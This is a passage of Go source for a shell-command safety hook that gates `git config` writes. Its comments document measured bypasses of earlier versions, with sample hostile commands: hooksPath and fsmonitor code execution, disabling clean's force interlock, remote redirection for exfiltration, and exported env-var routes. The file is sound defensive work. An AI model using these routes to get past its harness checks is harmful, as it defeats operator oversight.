	if sub, _ := cmdparse.FirstOperand(args); sub == "get" || sub == "list" {
		maxOperands = 2 // the git 2.54 subcommand token, plus at most one key
	}
	return len(cmdparse.Operands(args)) <= maxOperands
}

// configKeyID reduces a `git config` key token to the identity gatedConfigKeys is
// keyed on — `<section>.<name>`, LOWERCASED, with any middle subsection DROPPED —
// and reports false for a token that is not key-shaped, which is how a value
// operand is skipped.
//
// LOWERCASING IS GIT'S OWN RULE, not a convenience: git documents section and
// variable names as case-INsensitive (only the subsection is case-sensitive), and
// measured on git 2.54.0, 2026-07-30, `git config CORE.HooksPath /tmp/h` followed
// by `git config --get core.hookspath` printed `/tmp/h`. A case-sensitive table
// would be bypassed by capitalisation.
//
// DROPPING THE MIDDLE is what lets one table entry cover every scope spelling of
// the same variable, which is how git itself treats them: `http.sslVerify` and
// `http.https://host/.sslVerify` (both measured accepted), `diff.<driver>.textconv`,
// `url.<base>.insteadOf`, `credential.<url>.helper`. Only the FIRST and LAST
// segments are read, because the subsection may contain dots and slashes — a
// fixed-part split would fail on `url.https://evil.invalid/.insteadOf`, whose
// subsection alone holds two dots.
func configKeyID(tok string) (section, id string, ok bool) {
	first := strings.IndexByte(tok, '.')
	if first <= 0 {
		return "", "", false // no dot, or an empty section: not a config key
	}
	name := strings.ToLower(tok[strings.LastIndexByte(tok, '.')+1:])
	if name == "" {
		return "", "", false // a trailing dot: no variable name
	}
	section = strings.ToLower(tok[:first])
	return section, section + "." + name, true
}

// gatedConfigKey returns the first operand of a `git config` that names a gated
// key, with the class that decides its verdict.
//
// IT SCANS EVERY OPERAND, WHICH IS THE STRONGER FORM OF THE BEAD'S CONSTRAINT, NOT
// A DEPARTURE FROM IT. The requirement is that the key be located by the operand
// walk rather than at a fixed index, and cmdparse.Operands IS that walk —
// cmdparse.FirstOperand's whole-list form, sharing its one operandIndexes scan. A
// single FirstOperand read is not sufficient here the way it is for `git remote`,
// because `git config` accepts its key at three different operand POSITIONS: first
// in `git config <key> <value>`, second in the git 2.54 `git config set <key>
// <value>`, and second again after a separated `-f <file>` (measured accepted,
// 2026-07-30). Asking "does ANY operand name a gated key" is the only formulation
// none of those walks around. args are already configElideFlagValues'd, so the only
// tokens missing from the scan are ones git ITSELF hands to a flag — never the key
// of a valid write, which always keeps both its key and its value. A regression here
// MUST NOT be fixed by reintroducing an index.
func gatedConfigKey(args []string) (string, configGateClass, bool) {
	for _, op := range cmdparse.Operands(args) {
		section, id, ok := configKeyID(op)
		if !ok {
			continue
		}
		if class, gated := gatedConfigKeys[id]; gated {
			return op, class, true
		}
		if class, gated := gatedConfigSections[section]; gated {
			return op, class, true
		}
	}
	return "", 0, false
}

// configVerdict returns the verdict for a `git config` — rest being the args AFTER
// the `config` subcommand. Like remoteVerdict it always answers, because every
// `git config` is a read, a gated write, or an ordinary write.
//
// THE DEFECT IT CLOSES (pg2-szadj, 2026-07-30). `config` was a plain member of
// modifyingSubcommands, so EVERY key was approved outright with no key inspection
// at any flag position. Measured `allow` on a binary built from main @ 259f3331:
// `git config clean.requireForce false`, `git config --global clean.requireForce
// false`, `git config --type=bool clean.requireForce false` and `git config
// core.hooksPath /tmp/h`. The `-c` injection route for the same sinks was already
// guarded by hasGitConfigInjection; only the PORCELAIN route was open, and the
// `.git`-write guard deliberately exempts git's own arguments ("git is the
// sanctioned porcelain"), so there was no second line of defence.
//
// WHAT MADE IT WORSE THAN A MISSING PROMPT, AS THE `clean` ARM STOOD IN JULY 2026:
// `git clean` still Asked. The operator answering that prompt did so under the belief
// that git would refuse to delete without an explicit force flag — an invariant the
// config write had already removed. The prompt survived; the information behind it did
// not.
//
// THAT HALF IS NOW MOOT; THIS GATE IS NOT. pg2-u0e0c moved the `clean` arm to a
// uniform Abstain (operator ruling pg2-4yy4r item 3), so this rule no longer poses a
// question a config write could falsify. The write stays gated because removing git's
// own refusal is still a real loss and this is the only site that sees it happen. See
// the `clean` arm in classify, and gatedConfigKeys for the per-key survey, the
// Ask-vs-Reject reasoning, and the invariant each verdict rests on.
//
// THE INVARIANTS THE GATED VERDICTS REST ON, so a later reader can check whether
// they are still true:
//
//   - INTERLOCK class — the gated key's git DEFAULT is still the safe value, and no
//     config in scope has changed it. Verify per key with `git config --get <key>`
//     returning nothing (measured: the flag form is a read and stays approvable).
//   - SINK class — the only programs git executes during an ordinary operation are
//     the ones the operator's own configuration names. Verify with `git config
//     --list --show-origin` and read the origins.
//   - REDIRECT class — a remote NAME still resolves to the URL the operator
//     configured. This is the same invariant remoteVerdict protects; `git remote
//     get-url <name>` (approvable) is the check.
//
// READS STAY APPROVE, WITH A CORRECTED REASON. Before this change a read reached
// the modifying arm and was approved as `"modifying git command"` — measured for
// `git config --get user.email`, which modifies nothing. That reason was wrong for
// a read and is now `"read-only git config"`. configIsRead holds the
// discrimination and its bound.
//
// THIS IS THE MODELLING gitdir EXPLICITLY DEFERS HERE. bindingDirection's
// "RESIDUAL ASYMMETRY" note records that a bare `git` cannot be given a read/write
// direction "without modelling every subcommand — the `git` rule's job", citing
// corpus row 237336, which binds `.git/config` and then `git config --unset-all`s
// it. configIsRead is that modelling for `config`, and `--unset-all` is one of the
// write indicators it recognises.
//
// FALSE-POSITIVE COST IS ZERO, measured 2026-07-30 by enumerating every `git
// config` invocation in this repo. The writes are all
// `git-branch-maintenance.protectedBranch` / `.protectedWorktree` (`--local --add`,
// `--unset`, `--unset-all`) and the reads are `pgii-integrate-branch.primaryBranch`
// / `.strategy` and `user.email`. Not one names a gated key, so every in-tree caller
// keeps its Approve.
//
// ONE OTHER VERDICT MOVES, and it is deliberate: a config READ under a redirected
// GIT_DIR/GIT_WORK_TREE. It used to reach the modifying arm and its
// hasRedirectEnvVar Ask; the read short-circuit above now Approves it. That is the
// policy this rule already applies to every other read — `GIT_DIR=/other git log`
// is an Approve (TestGit_GitDirReadOnly_Approve) — so recognising config reads as
// reads makes the two consistent rather than carving an exception. WRITES keep the
// redirect Ask, which is why hasRedirectEnvVar is still consulted below.
//
// ORDINARY WRITES ARE UNTOUCHED, and that is a requirement rather than a
// side effect: `user.email`, `commit.gpgsign` and `branch.<name>.remote` keep
// their Approve with their existing `"modifying git command"` reason, and
// TestGit_Modifying_Approve's `git config x y` row still passes. A blanket
// Ask/Reject on every `git config` write would be the wrong fix — a large
// false-positive surface over routine traffic.
//
// TEXT VS PARSED: every test here reads PARSED tokens (post-unquote
// cmdparse.ParsedCommand.Args) and the rule runs only when
// isGitExecutable(pc.Executable), so `git config clean.requireForce false` quoted
// in a commit message or a `bd comment` body is TEXT and never matches. That is the
// pg2-5b901 failure mode; do not reintroduce a strings.Contains over command text.
func (r *Rule) configVerdict(envs []cmdparse.EnvAssignment, rest []string) hookio.RuleResult {
	// Elide separated flag ARGUMENTS once, here, so the read/write bound and the key
	// scan agree about what is an operand. Both consumers below take elided args.
	args := configElideFlagValues(rest)
	if configIsRead(args) {
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "read-only git config", Module: r.Name()}
	}
	if key, class, ok := gatedConfigKey(args); ok {
		return r.configGateResult(key, class)
	}
	if hasRedirectEnvVar(envs) {
		return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}
	}
	return hookio.RuleResult{Decision: hookio.Approve, Reason: "modifying git command", Module: r.Name()}
}

// configGateResult turns a gated key and its class into the verdict. The mapping
// lives here rather than in gatedConfigKeys so that every key of one mechanism is
// answered identically — see gatedConfigKeys for why redirect is a Reject while
// sink and interlock are Asks.
//
// The default arm answers ASK, so a class added to configGateClass without a
// verdict of its own fails toward the prompt rather than toward an Approve.
func (r *Rule) configGateResult(key string, class configGateClass) hookio.RuleResult {
	switch class {
	case configRedirect:
		return hookio.RuleResult{
			Decision: hookio.Reject,
			Reason: "git: writing `" + key + "` is prohibited — it repoints where fetches and pushes go, so a later, " +
				"entirely ordinary `git push origin main` sends repository contents to another host with no `git remote` " +
				"change to show for it (pg2-szadj, 2026-07-30). It is refused rather than prompted because `git remote " +
				"set-url` is already refused for exactly this exfiltration reason, and the config spelling must not be " +
				"the cheaper way around that gate. Every spelling is refused, including --global/--local/--system, " +
				"`git config set`, and --unset. Ask the operator to run it by hand",
			Module: r.Name(),
		}
	case configInterlock:
		return hookio.RuleResult{
			Decision: hookio.Ask,
			Reason: "git: `git config " + key + "` disables a safety interlock — a refusal git makes by DEFAULT, so a " +
				"later command that looks unchanged stops refusing what it used to, and any prompt on that command is " +
				"then answered under a belief that is no longer true (pg2-szadj, 2026-07-30). Every spelling is gated, " +
				"including --global/--local/--system, --type=bool, `git config set` and --unset; reads are not. Confirm " +
				"this is intended, or hand it to the operator",
			Module: r.Name(),
		}
	default: // configSink, and any class added without a verdict of its own
		return hookio.RuleResult{
			Decision: hookio.Ask,
			Reason: "git: `git config " + key + "` points git at a program of the caller's choosing, which git then runs " +
				"during an ordinary git operation — arbitrary code execution with nothing at that later command to show " +
				"for it (pg2-szadj, 2026-07-30). Every spelling is gated, including --global/--local/--system, " +
				"--type=bool, `git config set` and --unset; reads are not. Confirm this is intended, or hand it to the " +
				"operator",
			Module: r.Name(),
		}
	}
}

// chdirSafe reports whether the `-C` target directory is in a zone appropriate
// for the subcommand's access class. Read-only subcommands — and a read-only
// `git remote` — require the directory be READABLE; every other approvable
// subcommand (checkout, rebase, filter-branch, soft reset, and the modifying
// set) writes and requires it be WRITABLE. Returns true (no gate) when no `-C`
// is present or no evaluator is configured, preserving legacy behavior.
//
// `config` is DELIBERATELY not listed beside `remote` even though configVerdict
// now answers Approve for a read: this function sees only the subcommand, not the
// verdict, so listing it would drop the write-access requirement from every `git
// config -C <dir> <key> <value>` too. Leaving it in the writable class keeps a
// read-only `git config -C <dir> --get <key>` at exactly the demotion it had
// before this bead — an over-restriction on the safe side, unchanged by pg2-szadj.
func (r *Rule) chdirSafe(cwd string, chdirs []string, subcmd string) bool {
	if r.eval == nil || len(chdirs) == 0 {
		return true
	}
	access := r.eval.Evaluate(effectiveDir(cwd, chdirs))
	if readOnlySubcommands[subcmd] || subcmd == "remote" {
		return access.CanRead()
	}
	return access.CanWrite()
}

// effectiveDir folds git's `-C` chdir values onto cwd the way git does: an
// absolute chdir resets the running directory, a relative one is joined onto
// it. A leading `~` is expanded to the user's home so an unexpanded tilde
// cannot be mistaken for an in-project directory (a shell would expand it
// before git runs). Mirrors primarycommit.effectiveDir (unexported there); any
// env var in the folded path is expanded by patheval.PathEvaluator.Evaluate.
func effectiveDir(cwd string, chdirs []string) string {
	dir := cwd
	for _, c := range chdirs {
		c = expandTilde(c)
		if filepath.IsAbs(c) {
			dir = c
		} else {
			dir = filepath.Join(dir, c)
		}
	}
	return dir
}

// expandTilde expands a leading `~` or `~/` to the user's home directory,
// mirroring patheval's cleanPath so a `-C ~/...` value is resolved to an
// absolute path before zone classification. Non-tilde paths are returned as-is.
func expandTilde(p string) string {
	if p == "~" || strings.HasPrefix(p, "~/") {
		if home, err := os.UserHomeDir(); err == nil && home != "" {
			return filepath.Join(home, strings.TrimPrefix(p, "~"))
		}
	}
	return p
}

func isGitExecutable(exec string) bool {
	return exec == "git" || filepath.Base(exec) == "git"
}

// configFlagValuePredicate answers, for ONE allowlisted `-c` key, whether the
// VALUE the caller gave it is safe. It is the second half of clearedConfigFlagPairs'
// (key -> value predicate) entry, and the half a key-only allowlist would omit.
type configFlagValuePredicate func(value string) bool

// clearedConfigFlagPairs is the CLOSED allowlist of pre-subcommand
// `-c <key>[=<value>]` pairs hasGitConfigInjection will CLEAR — i.e. let past the
// injection guard so the command reaches its ordinary verdict. Keys are stored
// LOWERCASED, because that is the form the lookup normalizes to.
//
// THE CLOSEDNESS IS THE SECURITY CONTROL, NOT ANY DENYLIST (pg2-arfw6 spec S-1). A
// key that is not a member is not cleared, whatever its value, so a git config key
// that does not exist yet is excluded by construction. The lists of dangerous keys
// in gatedConfigKeys' survey and in pg2-arfw6's S-8 are DOCUMENTATION of why the
// membership is this short; they are not what does the excluding.
//
// EVERY ENTRY IS A PAIR, AND THAT IS THE FINDING THAT SHAPED THIS TABLE. A key-only
// allowlist was proposed and REJECTED — see hasGitConfigInjection for the
// `core.fsmonitor` measurement that killed it.
//
// PROVENANCE PER ENTRY, so a later widening is attributable. Each entry has its OWN
// operator ruling and its OWN predicate; none is a widening of another, and a new key
// needs a ruling and a row here rather than an appeal to an existing entry:
//
//	core.fsmonitor   pg2-arfw6, operator spec S-2 of 2026-07-28. Predicate: the value
//	                 is a git BOOLEAN LITERAL. That bead's spec says its allowlist has
//	                 exactly one entry, and this is it.
//	core.editor      pg2-6qh3p, operator ruling on pg2-agprs of 2026-08-13 — the
//	sequence.editor  INERT-VALUE EDITOR CARVE-OUT. Predicate: the value is one of two
//	                 EXACT literal tokens. These two are NOT a widening of the
//	                 `core.fsmonitor` entry and MUST NOT be read as one — they were
//	                 added to close the GIT_SEQUENCE_EDITOR env-route bypass of an
//	                 argv screen while removing the measured prompt cost of the inert
//	                 `GIT_EDITOR=true` idiom. See isInertEditorValue for the ruling,
//	                 the measurements, and the three constraints it imposes.
//
// THE PREDICATES ARE DELIBERATELY DIFFERENT SHAPES, AND MUST NOT BE SHARED.
// `core.fsmonitor` accepts a CLASS of values (any git boolean literal, matched
// case-insensitively) because git's own boolean parse of that key is case-insensitive
// and no member of the class can name a program. The editor keys accept TWO EXACT
// TOKENS, case-sensitively, because their ruling requires an exact-token allowance.
// Reusing one predicate for the other key would silently re-rule one of them —
// `isGitBooleanLiteral` on `core.editor` would clear `-c core.editor=1`, and
// `isInertEditorValue` on `core.fsmonitor` would start prompting the boolean traffic
// pg2-arfw6 exists to relieve. TestGit_ConfigFlagAllowlist_TableShape pins the pairing.
//
// VALUE-READING STOPS HERE. Everywhere else the git rule is deliberately value-blind
// or key-blind (hasGitConfigEnvInjection is key-blind; hasGitProgramEnvVar is
// value-blind for every variable OUTSIDE gitEditorEnvVars), for measured reasons those
// functions record. This table plus its env twin is the one bounded exception, and it
// stays bounded BECAUSE it is a closed enumeration of pairs rather than a policy about
// values. TestGit_ConfigFlagAllowlist_TableShape pins the membership so that adding an
// entry is a deliberate, reviewable act.
var clearedConfigFlagPairs = map[string]configFlagValuePredicate{
	"core.fsmonitor": isGitBooleanLiteral,
	// The editor carve-out (pg2-6qh3p). These are the ARGV TWINS of GIT_EDITOR and
	// GIT_SEQUENCE_EDITOR, and carving out only the env half would break the relation
	// pg2-6c85x established — "the env spelling is never LESS restrictive than argv" —
	// which its own tests assert. That is why both halves land in one change.
	"core.editor":     isInertEditorValue,
	"sequence.editor": isInertEditorValue,
}

// inertEditorValues is the EXACT-TOKEN allowance for the editor family: the only two
// values for which an editor key or variable is not screened. It is a set of literal
// tokens, never a pattern — see isInertEditorValue.
var inertEditorValues = map[string]bool{
	// git's own `true(1)`: succeeds, reads nothing, writes nothing.
	"true": true,
	// The shell's null command. git runs the editor THROUGH A SHELL, so `:` is the
	// idiomatic no-op editor and is what this rule's own configenv_test.go already
	// pins for the scripted rebase.
	":": true,
}

// isInertEditorValue reports whether an editor value is one of the two INERT literals
// the operator carved out. It is the predicate for `core.editor` / `sequence.editor` in
// clearedConfigFlagPairs and for GIT_EDITOR / GIT_SEQUENCE_EDITOR in
// hasGitProgramEnvVar, so the argv and env spellings cannot drift apart.
//
// THE RULING (operator, on pg2-agprs, 2026-08-13; implemented by pg2-6qh3p; also stored
// as bd memory `ceta-editor-carveout-ruling`). Allow the EXACT literal values `true`
// and `:`; screen every other value; apply it to the WHOLE editor family in BOTH
// spellings — `GIT_EDITOR`, `GIT_SEQUENCE_EDITOR`, `git -c core.editor=`,
// `git -c sequence.editor=`.
//
// # WHAT IT BUYS, BOTH HALVES MEASURED
//
//  1. IT CLOSES A REAL HOLE. `GIT_SEQUENCE_EDITOR` was MEASURED reaching an exec sink
//     in pg2-6c85x — it ran a marker on `.git/rebase-merge/git-rebase-todo` on git
//     2.54.0 — and was nevertheless DECLINED there, because this rule's own rebase arm
//     REQUIRES the variable and a landed pg2-a12rl test pins its Approve. So its argv
//     twin `git -c sequence.editor=<prog> rebase -i` was screened while the env
//     spelling was APPROVED: an env-route bypass of an argv screen, the same class the
//     pg2-a12rl / pg2-6c85x family exists to close. Reading the VALUE is what lets the
//     variable be screened WITHOUT demoting the idiom the rebase arm mandates.
//  2. IT REMOVES THE FRICTION pg2-6c85x INTRODUCED. 65 of that bead's 97
//     newly-prompting rows were `GIT_EDITOR=true git rebase --continue/--skip`
//     (~0.43/day). `true` is inert, so under the carve-out they stop prompting.
//
// # THE THREE CONSTRAINTS THE RULING IMPOSES, AND WHERE EACH IS DISCHARGED
//
//	(a) THE CARVE-OUT MUST APPLY TO THE ARGV SPELLINGS TOO. Discharged by the
//	    `core.editor` / `sequence.editor` entries in clearedConfigFlagPairs. Carving out
//	    only the env half would make env LESS restrictive than argv for the inert
//	    values, breaking pg2-6c85x's relation and failing its tests. This is the
//	    constraint most easily missed, so it is the one the tests state as a relation
//	    over both spellings rather than as literal verdicts.
//	(b) THE ALLOWANCE MUST BE EXACT-TOKEN — never a prefix, substring, or regex match.
//	    Discharged by inertEditorValues being a map keyed on whole values. These sites
//	    become VALUE-READING, a deliberate departure from the value-blind posture used
//	    everywhere else in this file (gitProgramEnvVars records why value-blindness was
//	    chosen there, and pg2-a12rl's key-blindness likewise), so the departure has to
//	    be tight and auditable. A prefix match would clear `truex`, `true; evil` and
//	    `:;evil`; a substring match would clear `/bin/true`.
//	(c) A VALUE THAT IS NOT A LITERAL MUST REACH THE SCREENED VERDICT. Fail-closed.
//	    Discharged twice over: such a value is not one of the two tokens anyway, and
//	    hasGitProgramEnvVar additionally requires cmdparse's own
//	    ExpansionNone classification, so `GIT_EDITOR=$X` and `GIT_EDITOR=$(echo true)`
//	    cannot reach the carve-out even if a future edit widened the token set.
//
// # THE NEAR-MISSES, AND WHY EACH IS SCREENED RATHER THAN CLEARED
//
//	truex        a longer token is a different program name
//	"true "      a trailing space makes it a different token; git splits on the shell's rules, not ours
//	/bin/true    a PATH is a program the caller chose, even when today's binary is harmless
//	:;evil       `;` ends the editor and starts a command
//	TRUE         env VALUES are case-SENSITIVE (measured in pg2-6c85x); `TRUE` is not `true(1)`
//	"true"       cmdparse keeps the assignment value RAW, quotes included, so the quoted
//	             spelling is a different token and fails closed. That is the correct
//	             direction for an exact-token allowance and it costs one prompt on a
//	             spelling the measured traffic does not use.
//
// THE CARVE-OUT IS VALUE-ONLY AND CHANGES NO OTHER AXIS. It does not widen which
// subcommands are approvable, does not touch the rebase arm's requirement that the
// variable be PRESENT for an interactive rebase, and — because hasGitProgramEnvVar is a
// demotion of an Approve, never a pre-classify short-circuit — it cannot weaken a
// decisive verdict. `GIT_EDITOR=true git tag v1` is the same Reject it always was.
//
// ONE RESIDUAL ASYMMETRY IS LEFT VISIBLE RATHER THAN CLOSED. The rebase arm keys on the
// ENV spelling (hasSequenceEditorEnvVar), so `git -c sequence.editor=: rebase -i main`
// still abstains with "requires editor" while `GIT_SEQUENCE_EDITOR=: git rebase -i main`
// approves. The `-c` IS cleared — that is this bead's job and it is done — and what
// remains is a DIFFERENT gate, erring toward the prompt for the argv spelling. Teaching
// the rebase arm to accept the argv twin would re-rule the rebase carve-out itself,
// which is its own ruling and its own bead.
func isInertEditorValue(value string) bool {
	return inertEditorValues[value]
}

// isGitBooleanLiteral reports whether value is one of git's BOOLEAN LITERALS, tested
// case-insensitively because git's own config boolean parse is.
//
// THE EMPTY VALUE IS DELIBERATELY NOT A MEMBER. `git -c core.fsmonitor= status` is
// accepted by real git and reads as boolean FALSE (measured, git 2.54.0), so an
// "is git boolean" predicate could arguably include it — pg2-arfw6's S-2 keeps the
// predicate to EXPLICIT literals instead, so the allowlist never turns on an absence.
// A value that is empty because a shell expansion produced nothing is
// indistinguishable from one written empty, and that is exactly the case a value
// predicate must not clear.
func isGitBooleanLiteral(value string) bool {
	switch strings.ToLower(value) {
	case "true", "false", "1", "0", "yes", "no", "on", "off":
		return true
	}
	return false
}

// configFlagPairCleared reports whether ONE pre-subcommand `-c` argument — the
// `<key>[=<value>]` token git's own `-c` consumes — is cleared by
// clearedConfigFlagPairs.
//
// A BARE `-c <key>` WITH NO `=` IS VALUE `true` (pg2-arfw6 S-4). That is git's own
// reading, verified on git 2.54.0: `git -c core.fsmonitor status` exits 0, executes
// nothing, and there is no program for the caller to name in it.
//
// THE KEY IS LOWERCASED AND MATCHED WHOLE. Git config section and variable names are
// case-INSENSITIVE — measured on git 2.54.0, `git -c CORE.FSMONITOR=<script> status`
// EXECUTED the script — so a case variant must resolve to the same entry or
// `-c core.FSMonitor=false` would prompt for no reason (S-3). It is matched WHOLE
// rather than through configKeyID, which drops a middle SUBSECTION: `core.x.fsmonitor`
// is a different key to git (subsections are case-sensitive and `core` has none), and
// collapsing it onto `core.fsmonitor` would clear a token the allowlist never named.
// Anything that does not resolve to a member — a malformed token, an empty key, a
// subsectioned spelling — is simply not cleared.
func configFlagPairCleared(tok string) bool {
	key, value := tok, "true"
	if eq := strings.IndexByte(tok, '='); eq >= 0 {
		key, value = tok[:eq], tok[eq+1:]
	}
	predicate, listed := clearedConfigFlagPairs[strings.ToLower(key)]
	return listed && predicate(value)
}

// configFlagInjectionReason is the ONE reason string the `-c` / `--config-env` floor
// reports, named rather than repeated because pg2-6f4q9 gave the screen three arms (the
// no-subcommand case, the not-applicable case, and the Approve demotion) and three
// literals would drift. The text is UNCHANGED from the pre-pg2-6f4q9 short-circuit, so
// the reason a reader sees for an already-`{}` row is exactly the one they saw before.
const configFlagInjectionReason = "git: -c/--config-env injects config; deferring to prompt"

// hasGitConfigInjection reports whether a pre-subcommand `-c` or `--config-env` flag
// injects config this rule will not clear. It scans only the option span before the
// git subcommand (mirroring cmdparse.GitInvocation's flag-consuming walk) so that a
// `-c` appearing AFTER the subcommand (e.g. `git commit -c <commit>`) is not matched.
//
// IT IS NO LONGER AN UNCONDITIONAL `-c` ABSTAIN (pg2-arfw6, operator decision of
// 2026-07-28). A `-c` whose pair is in clearedConfigFlagPairs is cleared and the
// command goes on to its ordinary verdict; everything else abstains exactly as before.
//
// pg2-b3eow'S RULING IS SUPERSEDED, AND SAYING SO HERE IS THE POINT. That bead
// (CLOSED) ruled `-c` "out of scope per RCE guard", which is why the guard was
// unconditional for as long as it was. The 2026-07-28 operator decision on pg2-arfw6
// replaces that ruling with the narrow pair allowlist below. The two are not left in
// contradiction: pg2-b3eow's reasoning about the RCE class is intact and is why the
// allowlist is CLOSED — what changed is only that a provably-inert pair may now clear.
//
// # WHY A KEY-ONLY ALLOWLIST IS UNSOUND — the finding that reshaped the design
//
// The first proposal (2026-07-25) named `core.fsmonitor` as a "provably-inert key".
// IT IS NOT AN INERT KEY. `git help config`: "If set to true, enable the built-in file
// system monitor daemon … Otherwise, this variable contains the pathname of the
// 'fsmonitor' hook command." Confirmed empirically on git 2.54.0 in a throwaway repo:
// `git -c core.fsmonitor=<script> status` EXECUTED the script, and so did
// `git -c CORE.FSMONITOR=<script> status`. So for this key the entire safety question
// lives in the VALUE, and an allowlist keyed on the name alone would have handed back
// the RCE it was written to close. Hence pairs — see clearedConfigFlagPairs. A future
// triage MUST NOT propose a key-only allowlist a third time.
//
// # THE FOUR PROPERTIES A READER SHOULD NOT HAVE TO RE-DERIVE
//
//  1. ALL-OR-NOTHING over repeated `-c` (S-6). `-c` may appear many times; EVERY
//     occurrence must clear, and one that does not abstains the whole command. So
//     `git -c core.fsmonitor=false -c core.pager=EVIL log` abstains.
//  2. THE VERDICT STAYS ABSTAIN, NEVER Reject (S-6) — unchanged from before, via
//     r.refuse at the call site.
//  3. RELAXATION ONLY (S-7). Clearing a `-c` removes nothing but the early return in
//     Evaluate, so the command reaches classify and gets the verdict it would have had
//     without the flag: a mutating or destructive subcommand keeps its Ask/Abstain/
//     Reject, and the `-C` chdirSafe demotion still applies afterward. No verdict is
//     upgraded by this function.
//  4. `--config-env` STAYS UNCONDITIONAL, in both spellings (S-5). Its value comes
//     from the ENVIRONMENT (`--config-env=KEY=ENVVAR`), so there is no value in the
//     command text for any predicate to evaluate. The same opacity reasoning keeps
//     hasGitConfigEnvInjection key-blind.
//
// THE EXACT-TOKEN `-c` TEST IS GIT'S OWN PARSE, which is why no abbreviation or glued
// spelling needs handling. Pre-subcommand options go through git's `handle_options()`,
// not parse-options: measured on git 2.54.0, `git -ccore.pager=EVIL log` and
// `git --config-en=core.pager=X log` each answered `unknown option: …` while the
// separated `-c core.pager=EVIL` and full `--config-env=` spellings worked. This is
// the measurement flagmatch_test.go's exactTokenExemptions entry for this function
// records.
//
// IT SCANS ARGV ONLY. The ENV spelling of the same injection is
// hasGitConfigEnvInjection — an env assignment never appears in pc.Args, cmdparse
// lifts it to pc.EnvVars.
//
// IT NO LONGER SHORT-CIRCUITS (pg2-6f4q9). This function still answers a pure
// PREDICATE about the argv, exactly as before; what changed is what Evaluate DOES with
// the answer. Until pg2-6f4q9 a `true` here returned before classify ran and REPLACED
// every verdict, so an irrelevant pair laundered a decisive Reject into `{}`. It is now
// a FLOOR: the refusal wins over an Approve or a not-applicable and LOSES to a decisive
// Ask/Reject. Every property in the list above is unaffected — all-or-nothing,
// abstain-never-Reject, relaxation-only and the unconditional `--config-env` are
// statements about THIS predicate, not about where its answer is consumed. See the read
// of `configFlagInjection` in Evaluate for the ruling and the four measured shapes.
func hasGitConfigInjection(args []string) bool {
	i := 0
	for i < len(args) {
		a := args[i]
		if a == "-c" {
			// git's `-c` takes the NEXT token as `<name>=<value>`; there is no glued
			// spelling (measured above). A trailing `-c` with nothing after it has no
			// pair to inspect, so it fails closed.
			if i+1 >= len(args) {
				return true
			}
			if !configFlagPairCleared(args[i+1]) {
				return true
			}
			i += 2
			continue
		}
		if a == "--config-env" || strings.HasPrefix(a, "--config-env=") {
			return true
		}
		switch a {
		case "-C", "--git-dir", "--work-tree", "--namespace":
			i += 2
			continue
		default:
			if strings.HasPrefix(a, "-") {
				i++
				continue
			}
			return false // first non-flag token is the subcommand
		}
	}
	return false
}

func hasFlag(args []string, flag string) bool {
	for _, a := range args {
		if a == flag {
			return true
		}
	}
	return false
}

// hasRedirectEnvVar reports whether git will run against a redirected repository —
// `GIT_DIR` or `GIT_WORK_TREE` pointing somewhere other than the invocation's own repo.
//
// IT TAKES THE VISIBLE ENVIRONMENT, NOT THE LEAF (pg2-xjt1s), so an `export GIT_DIR=…` on
// an EARLIER leaf of the same expression is seen. It read `pc.EnvVars` until then, which
// made the leaf-local prefix `GIT_DIR=/other git commit -m x` an Ask while the persistent
// `export GIT_DIR=/other; git commit -m x` measured `allow` — one redirection, two
// spellings, opposite answers. See visibleEnvVars for the seam and its limits.
func hasRedirectEnvVar(envs []cmdparse.EnvAssignment) bool {
	for _, ev := range envs {
		if ev.Name == "GIT_DIR" || ev.Name == "GIT_WORK_TREE" {
			return true
		}
	}
	return false
}

// visibleEnvVars returns the env assignments GIT WILL SEE on leaf `before` of this
// expression: that leaf's own prefix, plus every name an EARLIER leaf EXPORTS.
//
// # THE GAP IT CLOSES (pg2-xjt1s)
//
// All three of this file's env screens read ONE LEAF's own prefix, so the inline spelling
// was screened and the PERSISTENT spelling — the one that outlives the command — was not.
// Measured through the real binary on main @ a064a73e, 2026-08-14
// (scripts/probe-pg2-xjt1s.sh):
//
//	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=/tmp/evil git status  -> {}
//	export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=/tmp/evil; git status -> allow
//	GIT_PAGER=/tmp/evil git log     -> {}        export GIT_PAGER=/tmp/evil; git log     -> allow
//	GIT_DIR=/other git commit -m x  -> ask       export GIT_DIR=/other; git commit -m x  -> allow
//
// The export form is not the rare one: 111 of the 183 GIT_CONFIG-ASSIGNMENT-bearing Bash
// rows in the 154-day ask log spell it with `export` (read-only replay over an APFS clone,
// 2026-08-14). The bead recorded 97 of 179 on a narrower filter; the ratio is the finding
// and it held.
//
// # THE APPROACH RULING, WHICH THE BEAD REQUIRES BE RECORDED
//
// The two candidates were CROSS-LEAF ORDERING ANALYSIS IN THIS RULE and A NAME SCREEN IN
// THE ENV-VAR RULE. This is the first, for three reasons:
//
//  1. THE ASSIGNMENT LEAF IS NOT THE HAZARD; THE CONJUNCTION IS. `export GIT_PAGER=less`
//     on its own is ordinary, and so is `git log`. A rule that judges the assignment leaf
//     alone must either refuse a harmless export or approve it and lose the fact by the
//     time the git leaf is judged. Only the rule that judges the GIT invocation can see
//     both halves, so this is where the fact has to be read.
//  2. ONE TABLE PER HAZARD. gitProgramEnvVars, the `GIT_CONFIG_` prefix and the redirect
//     pair are the single sources of truth for what is screened, and several landed tests
//     ITERATE them (TestGit_ConfigEnvInjection_EveryGatedKeyIsScreened,
//     TestGit_ProgramEnvVar_TwinIsAConfigSinkInTheRealTable). A second name list in the
//     env-var rule would be a copy that drifts — the exact defect pg2-a12rl, pg2-6c85x
//     and pg2-h1ori each closed one instance of.
//  3. THE VERDICT WOULD BE WRONG THERE. These screens are DEMOTIONS OF AN Approve on the
//     git leaf; the env-var rule's vocabulary for a dangerous name is a decisive Ask or
//     Reject on the assignment. Moving the screen would move the verdict LEVEL too,
//     which no ruling supports.
//
// It does NOT use hookio.HookInput.InCommandVars, and that is deliberate rather than an
// oversight: that map holds only values cmdparse could read LITERALLY and DELETES a name
// whose value it cannot (see cmdparse.InCommandVars' revocation). `export
// GIT_CONFIG_KEY_0=$K` would therefore be ABSENT from it, and absent reads as "no
// assignment" — failing OPEN on exactly the shape a value-blind screen must catch. This
// seam wants NAMES, so it reads the leaves.
//
